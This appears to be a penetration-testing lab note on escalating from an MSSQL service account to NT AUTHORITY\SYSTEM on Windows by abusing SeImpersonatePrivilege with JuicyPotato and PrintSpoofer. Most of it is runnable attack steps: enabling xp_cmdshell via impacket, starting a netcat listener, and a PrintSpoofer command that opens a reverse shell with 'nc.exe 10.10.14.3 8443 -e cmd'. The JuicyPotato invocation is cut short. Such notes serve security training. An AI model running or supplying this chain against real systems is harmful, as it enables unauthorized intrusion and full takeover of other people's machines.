- Each windows process has an access token.
- SeImpersonatePrivilege allows a process to impersonate another user's token
- Usually assigned to Administrators and service accounts
- Legitimately used to launch process as SYSTEM (eg, via winlogon token)
- Abused in "Potato" attacks to escalate from service account -> SYSTEM.
- Common after RCE in IIS/ASP.NET, Jenkins, MSSQL etc.


# SeImpersonatePrivilege - JuicyPotato / PrintSpoofer

## Overview

- `SeImpersonatePrivilege` allows impersonating another user's token.
- Commonly found on **service accounts** (MSSQL, IIS, Jenkins, etc.).
- Goal: Escalate to **NT AUTHORITY\SYSTEM**.
- Typical exploitation path:
  1. Gain command execution (e.g., `xp_cmdshell`)
  2. Verify `SeImpersonatePrivilege`
  3. Use:
     - **JuicyPotato** → Windows Server 2016 / Windows 10 < 1809
     - **PrintSpoofer** → Windows Server 2019 / Windows 10 1809+
     - **RoguePotato** → Alternative for newer systems

---

# 1. Connect to MSSQL

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

---

# 2. Enable xp_cmdshell

Inside MSSQL shell:

```sql
enable_xp_cmdshell
```

> **Note:** Impacket automatically runs `RECONFIGURE`.

---

# 3. Confirm Execution Context

```sql
xp_cmdshell whoami
```

Example:

```text
nt service\mssql$sqlexpress01
```

---

# 4. Check Privileges

```sql
xp_cmdshell whoami /priv
```

Look for:

```text
SeImpersonatePrivilege    Enabled
```

If enabled → Possible SYSTEM privilege escalation.

---

# 5. JuicyPotato (Windows Server 2016 / Win10 <1809)

Upload:

- JuicyPotato.exe
- nc.exe

Start listener:

```bash
sudo nc -lnvp 8443
```

Run from MSSQL:

```sql
xp_cmdshell c:\tools\JuicyPotato.exe  
```


Expected output:

```text
CreateProcessWithTokenW OK
NT AUTHORITY\SYSTEM
```

Verify shell:

```cmd
whoami
hostname
```

Expected:

```text
nt authority\system
```

---

# 6. PrintSpoofer (Windows Server 2019 / Win10 1809+)

Start listener:

```bash
nc -lnvp 8443
```

Run:

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Expected output:

```text
Found privilege: SeImpersonatePrivilege
CreateProcessAsUser() OK
```

Verify:

```cmd
whoami
```

Expected:

```text
nt authority\system
```
